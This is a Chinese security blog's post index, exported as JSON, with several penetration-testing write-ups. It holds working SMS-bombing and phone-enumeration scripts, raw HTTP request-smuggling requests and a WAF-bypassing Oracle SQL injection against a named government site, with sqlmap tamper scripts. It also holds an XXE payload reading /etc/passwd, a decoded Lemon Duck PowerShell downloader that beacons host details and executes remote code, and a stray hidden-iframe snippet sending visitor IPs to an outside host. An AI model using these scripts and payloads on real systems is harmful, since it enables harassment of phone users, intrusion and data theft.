[{"title":"某src xss绕过","date":"2019-09-30T02:07:45.000Z","path":"2019/09/30/某src-xss绕过/","text":"在挖某src的时候，发现了这样一个包： Content-type是text/html，而且使用的是jsonp，应该就存在xss问题了 尝试&lt;img src=x&gt;时发现被过滤了 尝试&lt;&gt;，可以输出 发现只要是&lt;&gt;标签内携带内容，就会被过滤 既然是过滤标签内的内容，看下双写会不会过滤 剩下一个&lt;,三写看看 舒服了,至少标签有了，那就可以构造payload了 剩下一个&lt;，可以用标签内的属性来帮忙过滤掉 这样就成功了","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"http请求走私漏洞翻译","date":"2019-09-30T01:12:28.000Z","path":"2019/09/30/http请求走私漏洞翻译/","text":"https://portswigger.net/web-security/request-smuggling/finding 这一节教导大家使用不同的方法来发现smuggling漏洞 使用计时技术来发现漏洞最常用的检测方法是发送请求，如果存在漏洞，那么会造成时延。Burp Scanner使用这种方法来检测smuggling漏洞 使用计时技术发现CL.TE漏洞（Content-Length.Transfer-Encoding）如果应用存在请求smuggling漏洞，那么可以使用Cl.TE变种进行攻击，发送下述请求通常会导致时间延迟12345678POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 41A==X== 由于前端服务器使用Content-Length头，它只会转发此请求的一部分，省略X。后端服务器使用Transfer-Encoding头，处理第一个块，等待下一块到达。这将导致可观察到的时间延迟。 使用计时技术发现TE.CL漏洞（Transfer-Encoding,Content-length）如果应用存在请求smuggling漏洞，那么可以使用TE.CL变种进行攻击，发送下述请求通常会导致时间延迟 12345678POST / HTTP/1.1Host: vulnerable-website.comTransfer-Encoding: chunkedContent-Length: 60X 由于前端服务器使用了Transfer-Encoding头，所以这回转发这个请求的一部分，不包含X。后端使用Content-Length头，认为报体内会有更多内容，等待后续内容到达，所以会导致可观察到的时间延迟。 注意⚠️：如果应用程序容易受到漏洞的CL.TE的攻击，那么TE.CL的基于时间的测试可能会影响正常用户。因此，要隐蔽并且尽量减少中断，您应该首先使用CL.TE测试，并且只有在第一次测试不成功时才继续进行TE.CL测试。 使用差异响应来确定请求smuggling漏洞如果应用可能存在请求smuggling漏洞，可以通过快速发送两个请求，触发应用程序的差异响应来进行进一步的确认 意图干扰下一个请求处理的“攻击”请求。 一个“正常”的请求。 如果对正常请求的响应存在预期的干扰效果，那么漏洞确实存在。 假设正常请求如下：123456POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling 这条请求一般接收状态代码为200的HTTP响应，包含了一些搜索结果。 干扰这条请求的攻击请求取决于smulling漏洞的种类:CL.TE还是TE.CL 使用差异响应来确认CL.TE漏洞为了确认CL.TE漏洞，你需要发送如下攻击包 12345678910111213POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: a23pplication/x-www-form-urlencodedContent-Length: 50Transfer-Encoding: chunkedeq=smuggling&amp;x=0GET /404 HTTP/1.1Foo: x 如果攻击成功，如果攻击成功，那么后端服务器会将这条请求的最后两行视为接收到的下一个请求。这将导致随后的“正常”请求看起来像这样： 1234567GET /404 HTTP/1.1Foo: xPOST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling 由于这条请求包含无效的URL，故服务器会响应状态代码为404的包，证明攻击请求确实在干扰它。 使用差异响应来确认TE.CL漏洞为了确认TE.CL漏洞，你需要发送如下攻击包 1234567891011121314POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 4Transfer-Encoding: chunked7cGET /404 HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 144x=0 要使用Burp Repeater发送此请求，你首先需要转到Repeater菜单，并确保未选中“ Update Content-Length”选项。你应当在最后在最后加上\\r\\n\\r\\n 如果攻击成功，则后端服务器将从GET /404以后的所有内容都视为收到的下一个请求。这将导致下面”正常”请求看起来像这样 1234567891011121314GET /404 HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 146x=0POST /search HTTP/1.1Host: vulnerable-website.comContent-Type: application/x-www-form-urlencodedContent-Length: 11q=smuggling 由于这条请求包含无效的URL，故服务器会响应状态代码为404的包，证明攻击请求确实在干扰它。 在尝试通过干扰其他请求来确认请求走私漏洞时，应牢记一些重要的注意事项 应当使用不同的网络连接将”攻击”请求和”正常”请求发送到服务器,通过同一连接发送两个请求无法证明该漏洞存在。 “攻击”请求和”正常”请求应尽可能使用相同的URL和参数名称。 这是因为许多现代应用程序都根据URL和参数将前端请求路由到不同的后端服务器。使用相同的URL和参数会增加由同一后端服务器处理请求的机会，这对于进行攻击至关重要。 在测试”正常”请求来检测来自”攻击”请求的任何干扰时，你正在与应用程序同时接收到的任何其他请求)包括来自其他用户的请求)竞争。你应该在”攻击”请求之后立即发送”正常”请求。如果应用程序忙，那么可能需要执行多次尝试以确认漏洞。 在某些应用程序中，前端服务器用作负载平衡器，并根据某种负载平衡算法将请求转发到不同的后端系统。如果将你的”攻击”和”正常”请求转发到不同的后端系统，那么攻击将失败。这是为什么你可能需要多次尝试才能确认漏洞的另一个原因。 如果你的攻击成功干扰了后续请求，但这不是你发送来检测干扰的”正常”请求，那么这意味着其他应用程序用户已受到你的攻击的影响。如果继续执行测试，可能会对其他用户造成破坏性影响，因此应谨慎行事。 进一步学习Exploiting HTTP request smuggling vulnerabilities【这篇文章下次翻译】","tags":[{"name":"翻译文章","slug":"翻译文章","permalink":"https://doggy-test.github.io/tags/翻译文章/"}]},{"title":"短信验证码问题（三）","date":"2019-08-28T08:04:14.000Z","path":"2019/08/28/短信验证码问题（三）/","text":"碰巧又遇到1个，记录一下 一个没有图形验证码的页面，猜猜也知道存在短信轰炸的问题 抓个包看一看 只有手机号，多次请求下看看 看样子做了点限制，不过还是可能存在遍历手机号发送短信验证码的问题，改下手机号试试 看样子不是，当我更改了cookie时发现返回包提示: 那么是不是通过cookie进行了限制？ 因为我是未登录状态，是不是代表着我每第一次请求在浏览器看来都是陌生人，需要set-cookie呢？如果每次请求都有新的cookie，是不是代表着我可以利用这样的cookie绕过限制进行短信轰炸？ python简单写了个访问请求，发现header里没有cookie字段 当我清空浏览器缓存时再次请求，发现依旧没有： 仔细查看页面请求内容时，在ajax请求里发现这样一条记录： 应该就是它了，写个python脚本试下 1234567891011121314151617181920212223242526272829303132if __name__ == '__main__' : requrl = \"https://xxx.com/sendMessage.do\" Cookies = [] for i in range(5): requrl2 = \"https://xxx.com/getSessionLogin.do\" headers = &#123; \"User-Agent\":\"Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36\", &#125; data = &#123; \"tranCode\":\"null\", \"EMP_SID\":\"\", \"responseFormat\":\"JSON\" &#125; _cookie = requests.post(url=requrl2,data=data,headers=headers).headers[\"Set-Cookie\"].split(\"Path=/\")[0] Cookies.append(_cookie) for i in range(5): headers =&#123; \"User-Agent\":\"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Mobile Safari/537.36\", \"Cookie\":Cookies[i] &#125; data = &#123; \"currentBusinessCode\": \"10000040\", \"tokenSync_rootBranchId\": \"15601\", \"phoneNo\": \"xxxx\", \"messageContent\": \"0014\", \"EMP_SID\": \"1\", \"responseFormat\": \"JSON\", &#125; r = requests.post(url=requrl,data=data,headers=headers) print r.text 成功","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"遍历手机号发送验证码(二)","date":"2019-07-26T07:28:10.000Z","path":"2019/07/26/遍历手机号发送验证码-二/","text":"var userip = returnCitySN.cip; var oIframe = document.createElement('iframe'); oIframe.src = 'http://test.avkxkd.ceye.io/?visitor_ip='+userip; oIframe.style.display = \"none\"; document.body.appendChild(oIframe); 之前写在笔记上的一次记录，转一下 直觉告诉我们这里可能有一个高达50rmb的遍历手机号发送验证短信的问题，抓包看下请求 当试着更改phone时，发现后端返回了一个错误 猜测bread应该是签名由于是网页端发起的请求，所以肯定是js进行签名，那么只要找到签名方式就可以了先看看加载了几个js 只有1个，那就好办了，打开它，我们搜索下关键词根据请求参数timeStamp找到如下代码 看到了bread，应该就是这段发起了请求 调用了secureSignature函数，再去源代码里搜索下secureSignature 这样加密方式就找到了，参数t猜测是带过去的get参数，试着验证下稍改下代码，得到o+n 用这个作为o，加上n再来一次 看到结果匹配上了 证明确实正确，那么可以用python写出个批量脚本 12345678910111213141516171819202122232425#encoding=UTF-8import hashlibimport requestsdef encyrpt(pkg): result = '' key_list = pkg.split(\"&amp;\") key_list.sort() token = \"64688142ca8a14ef1307fd2794771d37\" pkg = ''.join(key_list) sign = hashlib.md5(hashlib.md5(pkg+token).hexdigest()+token).hexdigest() return signif __name__ == '__main__': for i in range(99): phone = \"132888888\" + str(i).zfill(2) headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Linux; Android 6.0.1; MuMu Build/V417IR; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36 Html5Plus/1.0\" &#125; pkg = \"phone=\" + phone + \"&amp;timeStamp=&#123;&#125;\".format(str(time.time()).split(\".\")[0]+str(time.time()).split(\".\")[1].zfill(3)) url = \"http://xxx.com/customer/login/code/?&#123;&#125;&amp;bread=&#123;&#125;\".format(pkg,encyrpt(pkg)) print url r = requests.get(url,headers=headers) print r.text 当然这个t只是我们猜测的结果，如果想知道具体值，除了去源码分析，还可以利用调试 在相应的函数下设置断点 果然如此 虽然最后可惜他还是针对手机号码进行了限制～","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"一次解密","date":"2019-07-22T23:23:40.000Z","path":"2019/07/23/一次解密/","text":"在土司看到这样一篇帖子，要求解密 https://www.t00ls.net/viewthread.php?tid=51505&amp;rpid=853415&amp;ordertype=0&amp;page=1#pid853415 1Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('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')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd(); 注意到了 $(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String( 尝试用base64解码，发现是一串乱码，在结合前面DeflateStream，还做了层DEFLATE压缩，python的zlib模块似乎支持这个解密，就试了下，报了错误 根据这篇回答 https://stackoverflow.com/questions/1089662/python-inflate-and-deflate-implementations,是由于头和校验和的问题导致解码失败 这次成功解码 根据 https://blog.csdn.net/cssxn/article/details/89576953 可以使用更改别名的形式，来快捷解码，来试下 包含了多层iex加密 1234567891011121314151617181920212223242526$url = $z$comp_name = $env:COMPUTERNAME$guid = (get-wmiobject Win32_ComputerSystemProduct).UUID$mac = (Get-WmiObject Win32_NetworkAdapterConfiguration | where &#123;$_.ipenabled -EQ $true&#125;).Macaddress | select-object -first 1$os = (Get-WmiObject -class Win32_OperatingSystem).Version$bit = ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -split \"-\")[0]$timestamp = Get-Date -UFormat \"%s\"$finalurl = $url+\"?ID=\"+$comp_name+\"&amp;GUID=\"+$guid+\"&amp;MAC=\"+$mac+\"&amp;OS=\"+$os+\"&amp;BIT=\"+$bit+\"&amp;_T=\"+$timestamp$webclient = New-Object System.Net.WebClient$webclient.Headers.add(\"User-Agent\",\"Lemon-Duck-\"+$Lemon_Duck.replace('\\','-'))$res_bytes = $webclient.DownloadData($finalurl)if($res_bytes.count -gt 173)&#123;$sign_bytes = $res_bytes[0..171];$raw_bytes = $res_bytes[173..$res_bytes.count];$rsaParams = New-Object System.Security.Cryptography.RSAParameters$rsaParams.Modulus = 0xda,0x65,0xa8,0xd7,0xbb,0x97,0xbc,0x6d,0x41,0x5e,0x99,0x9d,0x82,0xff,0x2f,0xff,0x73,0x53,0x9a,0x73,0x6e,0x6c,0x7b,0x55,0xeb,0x67,0xd6,0xae,0x4e,0x23,0x3c,0x52,0x3d,0xc0,0xcd,0xcd,0x37,0x6b,0xf3,0x4f,0x3b,0x62,0x70,0x86,0x07,0x96,0x6e,0xca,0xde,0xbd,0xa6,0x4f,0xf6,0x11,0xd1,0x60,0xdc,0x88,0xbf,0x35,0xf2,0x92,0xee,0x6c,0xb8,0x2e,0x9b,0x7d,0x2b,0xd1,0x19,0x30,0x73,0xc6,0x52,0x01,0xcd,0xe7,0xc7,0x34,0x78,0x8a,0xa7,0x9f,0xe2,0x12,0xcd,0x79,0x40,0xa7,0x91,0x6a,0xae,0x95,0x8e,0x42,0xd0,0xcf,0x39,0x6e,0x30,0xcb,0x0a,0x98,0xdb,0x97,0x3f,0xf6,0x2e,0x95,0x10,0x72,0xfd,0x63,0xd5,0xf7,0x88,0x63,0xa4,0x7b,0xae,0x97,0xea,0x38,0xb7,0x47,0x6b,0x5d$rsaParams.Exponent = 0x01,0x00,0x01$rsa = New-Object -TypeName System.Security.Cryptography.RSACryptoServiceProvider;$rsa.ImportParameters($rsaParams)$base64 = -join([char[]]$sign_bytes)$byteArray = [convert]::FromBase64String($base64)$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProviderif($rsa.verifyData($raw_bytes,$sha1,$byteArray)) &#123;IEX (-join[char[]]$raw_bytes)&#125;&#125; 成功解密，运行的时候360报了木马，查看了下详情","tags":[{"name":"加密解密","slug":"加密解密","permalink":"https://doggy-test.github.io/tags/加密解密/"}]},{"title":"遍历手机号发送短信验证码","date":"2019-07-17T09:16:12.000Z","path":"2019/07/17/遍历手机号发送短信验证码/","text":"好久没更新了，之前放在七牛云上的图片因为临时域名的原因也挂了，把他导出来放在腾讯云图床了。另外几张图片放在了不知名小地方，现在已经找不回了 朋友丢过来一个站点，让帮忙测下是否有安全问题，其中注册那个地方有点ctf题目的意思，就记录一下 注册页面是这样的，存在以下3步 发送图形验证码 校验验证码是否正确 发送短信验证码 验证码长这样 试了几次，都是非常简单的问题，诸如1+1，3*3之类 根据多年搬砖经验，这里可能存在以下安全问题 图形验证码未设置错误即刷新，可多次暴破，结合第3步构造短信轰炸 第2步前端校验，可抓取第3步链接直接发送验证码，造成短信轰炸 尝试了下，发现问题1存在，问题2后端应该通过jsessionid进行了匹配,所以无法实现 第3步的包如下，发现使用了aes对手机号码进行了加密 通过前端代码分析，iv及key直接写在前端，且为定值，所以可以构造 因此，可以通过以下步骤，遍历手机号发送验证码 发起获取图形验证码请求 由于验证码问题简单，所以我设置了在-5-20的区间爆破图形验证码 构造手机号发起发送短信验证码请求 python脚本如下踩了个坑，padding值如果不一致，aes结果也会有区别，下次要注意12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#encoding=UTF-8import requestsfrom urllib import quoteimport base64from Crypto.Cipher import AESclass EncryptDate: def __init__(self): self.key = \"0102030405060708\" # 初始化密钥 self.length = AES.block_size # 初始化数据块大小 self.iv = \"0102030405060708\" self.aes = AES.new(self.key, AES.MODE_ECB,self.iv) # 初始化AES,ECB模式的实例 # 截断函数，去除填充的字符 self.unpad = lambda date: date[0:-ord(date[-1])] def pad(self, text): \"\"\" #填充函数，使被加密数据的字节码长度是block_size的整数倍 \"\"\" count = len(text.encode('utf-8')) add = self.length - (count % self.length) entext = text + (chr(add) * add) return entext def encrypt(self, encrData): # 加密函数 res = self.aes.encrypt(self.pad(encrData).encode(\"utf8\")) msg = base64.b64encode(res) return msg def decrypt(self, decrData): # 解密函数 res = base64.decodebytes(decrData.encode(\"utf8\")) msg = self.aes.decrypt(res).decode(\"utf8\") return self.unpad(msg)if __name__ == '__main__' : mobile = raw_input(\"please input the mobile:\") headers1 = &#123; \"cookie\":\"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; JSESSIONID=F68E4E88B2CE9E09CF53DAE54B48CC32\" &#125; headers2 = &#123; \"cookie\":\"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; CNZZDATA1260003247=218666546-1563266404-null%7C1563343898; JSESSIONID=D17C82584E2B7EBB709B59AFC1D38A2A\" &#125; headers3 = &#123; \"cookie\":\"__s_f_c_s_=A3EF9A409302284A99E5EA734AD4513A; Hm_lvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lpvt_8f9c28b1974aab0cc64aba339f45e783=1563265273; Hm_lvt_33846fe064fdf7896aa5d81e3470d7ff=1563266401; UM_distinctid=16bf9f041e6de-03a2b5c82ed71f-3a65420e-1aeaa0-16bf9f041e7582; __d_s_=A3FA4DC22607DB734F4623F82636FA9C; Hm_lpvt_33846fe064fdf7896aa5d81e3470d7ff=1563343892; CNZZDATA1260003247=218666546-1563266404-null%7C1563343898; JSESSIONID=D17C82584E2B7EBB709B59AFC1D38A2A\" &#125; get_img_url = \"http://xxxx.com.cn/imageVerifyCodeServlet?action=image&amp;t=1563331117584\" r1= requests.get(get_img_url,headers=headers1) brute_img_url = \"http://xxx.com.cn/register/person/checkVerifyCodeForSms\" for i in range(-5,20): data = &#123;\"securityCode\":str(i)&#125; r2 = requests.post(brute_img_url,headers=headers2,data=data) encryptdatta = EncryptDate() res = quote(encryptdatta.encrypt(mobile)) sendcode_url = \"http://xxxx.com.cn/register/person/sendAuthCode?loginAccount=\"+res+\"&amp;way=\"+res+\"&amp;_=1563266398865\" print requests.get(sendcode_url,headers=headers3).text 结果如下 还不错，最后一个估计是题目答案超出预设值了。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"一次过狗oracle手工注入","date":"2017-08-09T05:40:00.000Z","path":"2017/08/09/一次过狗oracle手工注入/","text":"0x01.前言 狗不是好狗，比较容易绕过，但也是第一次手工注入oracle，所以记录一下 0x02.过程网站的url长这样:http://www.xxx.cn/xxx.php?zjid=1000经过简单的测试，过滤了空格以及union select 通过fuzz，%0b没有过滤，union select可以通过简单的大小写转换绕过，怕是出现在ctf里的送分题。这样就简单了，简单改下sqlmap的tamper，成功跑出了数据库相关信息替换空格12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): retVal = payload if payload: retVal = \"\" quote, doublequote, firstspace = False, False, False for i in xrange(len(payload)): if not firstspace: if payload[i].isspace(): firstspace = True retVal += \"%0b\" continue elif payload[i] == '\\'': quote = not quote elif payload[i] == '\"': doublequote = not doublequote elif payload[i] == \" \" and not doublequote and not quote: retVal += \"%0b\" continue retVal += payload[i] return retVal 替换union和select123456789101112131415161718192021#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies(): passdef tamper(payload, **kwargs): &quot;&quot;&quot; Replaces UNION ALL SELECT with UNION SELECT &gt;&gt;&gt; tamper(&apos;-1 UNION ALL SELECT&apos;) &apos;-1 UNION SELECT&apos; &quot;&quot;&quot; payload = payload.replace(&apos;union&apos;,&apos;uNIon&apos;) payload = payload.replace(&apos;UNION&apos;,&apos;uNIon&apos;) payload = payload.replace(&apos;select&apos;,&apos;sELect&apos;) payload = payload.replace(&apos;SELECT&apos;,&apos;sELect&apos;) return payload if payload else payload 但是却跑不出数据库的信息，很迷惑，猜测过滤了其他内容。 所以根据sqlmap的语句又fuzz了下，过滤了varchar()函数，这次大小写无法绕过，所以只能手注。 先跑出库的信息1http://www.xxx.cn/xxx.php?zjid=-1884%0bUNION%0bALL%0bSELECT%0bNULL,NULL,NULL,NULL,(selECt%0bowner%0bfrom%0ball_tables%0bwhere%0brownum=1),NULL,NULL,NULL,NULL,NULL,NULL,NULL%0bFROM%0bDUAL-- 第二个库1http://www.xxx.cn/xxx.php?zjid=-1884%0bUNION%0bALL%0bSELECT%0bNULL,NULL,NULL,NULL,(selECt%0bowner%0bfrom%0ball_tables%0bwhere%0brownum=1%0band%0bowner&lt;&gt;&apos;SYS&apos;),NULL,NULL,NULL,NULL,NULL,NULL,NULL%0bFROM%0bDUAL-- 依此类推跑出所有库 再跑表的信息1http://www.hzfc.gov.cn/hzfccs/cxda/aqjddw/qydepart.php?zjid=-1884%0bUNION%0bALL%0bSELECT%0bNULL,NULL,NULL,NULL,(selECt%0btable_name%0bfrom%0buser_tables%0bwhere%0brownum=1),NULL,NULL,NULL,NULL,NULL,NULL,NULL%0bFROM%0bDUAL-- 第二个库1http://www.hzfc.gov.cn/hzfccs/cxda/aqjddw/qydepart.php?zjid=-1884%0bUNION%0bALL%0bSELECT%0bNULL,NULL,NULL,NULL,(selECt%0btable_name%0bfrom%0buser_tables%0bwhere%0brownum=1%0band%0btable_name&lt;&gt;&apos;xxx&apos;),NULL,NULL,NULL,NULL,NULL,NULL,NULL%0bFROM%0bDUAL-- 依此类推跑出所有表 列名和查询也和这个类似了，即使不记下来，百度也能找到一大堆，所以就省略不写了。 0x03.总结 这次也算的上是自己第一次手工注入oracle，其实很简单，和mysql的手工注入很类似，只是以前自己懒得动手，才觉得很难。学习和生活也是一样，遇到以为很难的事情，一定要去亲手实践，才能下定结论。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://doggy-test.github.io/tags/渗透测试/"}]},{"title":"7.12笔记","date":"2017-07-12T08:23:00.000Z","path":"2017/07/12/7-12笔记/","text":"1.dns解析 https://ricterz.me/posts/CUIT%20CTF%20Pentest%20Writeup python的dnspython模块可以用来进行dns的查询。123456789101112131415161718#encoding=UTF-8import dns.resolverdomain = \"njupt.edu.cn\"query_list = [\"A\",\"MX\",\"NS\",\"CNAME\"]\"\"\"A记录：将主机名转换成IP地址 MX记录：邮件交换记录，定义邮件服务器的域名 CNAME记录：别名记录，实现域名间的映射 。NS记录：标记区域的域名服务器及授权子域 ，用来指定该域名由哪个DNS服务器来进行解析\"\"\"for _query in query_list: try: print _query + \":\" result = dns.resolver.query(domain,_query) for each_answer in result.response.answer: print each_answer except Exception,e: print \"No result\" 结果为：12345678910A:njupt.edu.cn. 6607 IN A 202.119.230.8njupt.edu.cn. 6607 IN A 202.119.230.10MX:njupt.edu.cn. 6722 IN MX 1 em1.njupt.edu.cn.NS:njupt.edu.cn. 6764 IN NS ns.njupt.edu.cn.njupt.edu.cn. 6764 IN NS dns.njupt.edu.cn.CNAME:No result 2.Web Service http://bobao.360.cn/download/book/security-geek-2017-q2.pdf 12345678910111213SOAP（Simple Object Access Protocol，简单对象访问协议）型 Web Service。SOAP型的 Web Service 允许我们使用XML格式与服务器进行通信。REST（Representational State Transfer，表征性状态转移）型 Web Service。REST 型Web Service 允许我们使用 JSON 格式（也可以使用XML格式）与服务器进行通信。与 HTTP类似，该类型服务支持 GET、POST、PUT、DELETE 方法。WSDL（Web Services Description Language，网络服务描述语言）给出了 SOAP 型Web Service 的基本定义，WSDL 基于 XML 语言，描述了与服务交互的基本元素，比如函数、数据类型、功能等，少数情况下，WSDL 也可以用来描述 REST 型 Web Service。WADL（Web Application Description Language，网络应用描述语言）就像是 WSDL的 REST 版，一般用于 REST 型 Web Service，描述与 Web Service 进行交互的基本元素。 我们可以使用以下方式发现 Web Service：123451、使用代理软件，检查所捕获的数据。2、通过搜索引擎探测 Web 应用程序暴露的接口（比如目录遍历漏洞、lfi（本地文件包含）等）。3、爬取并解压 swf、jar 等类似文件。4、模糊测试。 web service可能存在的漏洞1234561.sql注入漏洞2.xpath注入漏洞3.xml注入漏洞4.xxe实体注入5.ssrf漏洞6.拒绝服务（DoS）漏洞 具体攻击利用等实战中遇到再来分析下 3.xxe实体注入 https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=17068&amp;highlight=xxe XXE全称XML External Entity Injection，也就是XML外部实体注入攻击，是对非安全的外部实体数据进行处理时引发的安全问题。利用poc12345678&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE copyright [ //DTD&lt;!ENTITY test SYSTEM &quot;file:///etc//passwd&quot;&gt; //自定义外部实体test，内容为file:///etc/passwd]&gt; &lt;reset&gt; &lt;login&gt;&amp;test;&lt;/login&gt; &lt;secret&gt;login&lt;/secret&gt;&lt;/reset&gt; 